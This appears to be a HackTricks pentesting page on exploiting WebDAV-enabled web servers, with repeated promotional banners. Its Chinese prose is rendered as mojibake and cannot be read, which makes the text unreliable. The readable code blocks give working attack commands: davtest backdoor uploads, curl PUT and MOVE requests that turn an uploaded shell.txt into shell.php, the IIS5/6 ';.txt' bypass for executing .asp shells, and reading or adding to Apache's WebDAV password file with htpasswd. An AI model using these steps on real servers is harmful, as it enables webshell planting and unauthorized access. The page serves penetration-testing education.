# WebDav

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) æ¥è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œè¿™äº›å·¥ä½œæµç¨‹ç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›çš„**ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒ HackTricks çš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ HackTricks ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥**åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

ä¸€ä¸ª**HTTP æœåŠ¡å™¨å¯ç”¨äº† WebDav** æ˜¯ä¸€ä¸ªä½ å¯èƒ½å¯ä»¥**æ›´æ–°ã€åˆ é™¤ã€ç§»åŠ¨ã€å¤åˆ¶**æ–‡ä»¶çš„æœåŠ¡å™¨ã€‚**æœ‰æ—¶**ä½ **éœ€è¦**æœ‰**æœ‰æ•ˆçš„å‡­è¯**ï¼ˆé€šå¸¸ä½¿ç”¨ HTTP åŸºæœ¬è®¤è¯æ£€æŸ¥ï¼‰ã€‚

ä½ åº”è¯¥å°è¯•**ä¸Šä¼ **ä¸€äº›**webshell**å¹¶ä» web æœåŠ¡å™¨**æ‰§è¡Œ**å®ƒæ¥æ§åˆ¶æœåŠ¡å™¨ã€‚\
é€šå¸¸ï¼Œè¦**è¿æ¥** WebDav æœåŠ¡å™¨ï¼Œä½ éœ€è¦æœ‰æ•ˆçš„**å‡­è¯**ï¼š[**WebDav æš´åŠ›ç ´è§£**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) _(åŸºæœ¬è®¤è¯)_ã€‚

å¦ä¸€ä¸ªå¸¸è§çš„é…ç½®æ˜¯**ç¦æ­¢ä¸Šä¼ **å°†ç”± web æœåŠ¡å™¨**æ‰§è¡Œ**çš„**æ‰©å±•å**çš„æ–‡ä»¶ï¼Œä½ åº”è¯¥æ£€æŸ¥å¦‚ä½•**ç»•è¿‡è¿™ä¸ªé™åˆ¶**ï¼š

* **ä¸Šä¼ **å¸¦æœ‰**å¯æ‰§è¡Œæ‰©å±•å**çš„æ–‡ä»¶ï¼ˆå¯èƒ½æ²¡æœ‰è¢«ç¦æ­¢ï¼‰ã€‚
* **ä¸Šä¼ **æ²¡æœ‰**å¯æ‰§è¡Œæ‰©å±•å**çš„æ–‡ä»¶ï¼ˆå¦‚ .txtï¼‰ï¼Œç„¶åå°è¯•**é‡å‘½å**æ–‡ä»¶ï¼ˆç§»åŠ¨ï¼‰ä¸ºå¸¦æœ‰**å¯æ‰§è¡Œæ‰©å±•å**ã€‚
* **ä¸Šä¼ **æ²¡æœ‰**å¯æ‰§è¡Œæ‰©å±•å**çš„æ–‡ä»¶ï¼ˆå¦‚ .txtï¼‰ï¼Œç„¶åå°è¯•**å¤åˆ¶**æ–‡ä»¶ï¼ˆç§»åŠ¨ï¼‰ä¸ºå¸¦æœ‰**å¯æ‰§è¡Œæ‰©å±•å**ã€‚

## DavTest

**Davtest** å°è¯•**ä¸Šä¼ å…·æœ‰ä¸åŒæ‰©å±•åçš„å¤šä¸ªæ–‡ä»¶**å¹¶**æ£€æŸ¥**æ‰©å±•åæ˜¯å¦**è¢«æ‰§è¡Œ**ï¼š
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
è¾“å‡ºæ ·æœ¬ï¼š

![](<../../.gitbook/assets/image (19) (1).png>)

è¿™å¹¶ä¸æ„å‘³ç€ **.txt** å’Œ **.html æ‰©å±•åæ­£åœ¨æ‰§è¡Œ**ã€‚è¿™æ„å‘³ç€ä½ å¯ä»¥é€šè¿‡ç½‘ç»œ**è®¿é—®è¿™äº›æ–‡ä»¶**ã€‚

## Cadaver

ä½ å¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…·æ¥**è¿æ¥åˆ° WebDav** æœåŠ¡å™¨å¹¶**æ‰‹åŠ¨**æ‰§è¡Œæ“ä½œï¼ˆå¦‚**ä¸Šä¼ **ã€**ç§»åŠ¨**æˆ–**åˆ é™¤**ï¼‰ã€‚
```
cadaver <IP>
```
## PUT è¯·æ±‚
```
curl -T 'shell.txt' 'http://$ip'
```
## MOVE è¯·æ±‚
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## IIS5/6 WebDav æ¼æ´

è¿™ä¸ªæ¼æ´éå¸¸æœ‰è¶£ã€‚**WebDav** **ä¸å…è®¸** **ä¸Šä¼ ** æˆ– **é‡å‘½å** å¸¦æœ‰æ‰©å±•å **.asp** çš„æ–‡ä»¶ã€‚ä½†æ˜¯ä½ å¯ä»¥é€šè¿‡åœ¨æ–‡ä»¶åæœ«å°¾**æ·»åŠ ** **";.txt"** æ¥**ç»•è¿‡**è¿™ä¸€é™åˆ¶ï¼Œæ–‡ä»¶å°†ä¼šåƒ .asp æ–‡ä»¶ä¸€æ ·è¢«**æ‰§è¡Œ**ï¼ˆä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ ".html" æ›¿ä»£ ".txt"ï¼Œä½†æ˜¯**ä¸è¦å¿˜è®° ";"**ï¼‰ã€‚

ç„¶åä½ å¯ä»¥å°†ä½ çš„ shell ä½œä¸ºä¸€ä¸ª ".**txt" æ–‡ä»¶** **ä¸Šä¼ **ï¼Œå¹¶å°†å…¶**å¤åˆ¶/ç§»åŠ¨**ä¸º ".asp;.txt" æ–‡ä»¶ã€‚é€šè¿‡ web æœåŠ¡å™¨è®¿é—®è¯¥æ–‡ä»¶æ—¶ï¼Œå®ƒå°†è¢«**æ‰§è¡Œ**ï¼ˆcadaver ä¼šè¯´ç§»åŠ¨æ“ä½œæ²¡æœ‰æˆåŠŸï¼Œä½†å®é™…ä¸Šå®ƒåšåˆ°äº†ï¼‰ã€‚

![](<../../.gitbook/assets/image (18) (1) (1).png>)

## æäº¤å‡­è¯

å¦‚æœ Webdav ä½¿ç”¨çš„æ˜¯ Apache æœåŠ¡å™¨ï¼Œä½ åº”è¯¥æŸ¥çœ‹ Apache ä¸­é…ç½®çš„ç«™ç‚¹ã€‚é€šå¸¸æ˜¯ï¼š\
_**/etc/apache2/sites-enabled/000-default**_

åœ¨å…¶ä¸­ä½ å¯èƒ½ä¼šæ‰¾åˆ°åƒè¿™æ ·çš„å†…å®¹ï¼š
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
æ­£å¦‚æ‚¨æ‰€è§ï¼Œè¿™é‡Œæœ‰æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ç”¨äº**webdav**æœåŠ¡å™¨çš„æœ‰æ•ˆ**å‡­æ®**ï¼š
```
/etc/apache2/users.password
```
åœ¨è¿™ç±»æ–‡ä»¶ä¸­ï¼Œæ‚¨ä¼šæ‰¾åˆ°**ç”¨æˆ·å**å’Œå¯†ç çš„**å“ˆå¸Œå€¼**ã€‚è¿™äº›æ˜¯webdavæœåŠ¡å™¨ç”¨æ¥è®¤è¯ç”¨æˆ·çš„å‡­æ®ã€‚

æ‚¨å¯ä»¥å°è¯•**ç ´è§£**å®ƒä»¬ï¼Œæˆ–è€…å¦‚æœæ‚¨å‡ºäºæŸç§åŸå› æƒ³è¦**è®¿é—®** **webdav** æœåŠ¡å™¨ï¼Œå¯ä»¥**æ·»åŠ æ›´å¤š**å‡­æ®ï¼š
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
è¦æ£€æŸ¥æ–°å‡­è¯æ˜¯å¦æœ‰æ•ˆï¼Œæ‚¨å¯ä»¥æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
<details>

<summary><strong>ä»é›¶åˆ°è‹±é›„å­¦ä¹ AWSé»‘å®¢æ”»å‡»</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**telegramç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) è½»æ¾æ„å»ºå¹¶**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œç”±ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
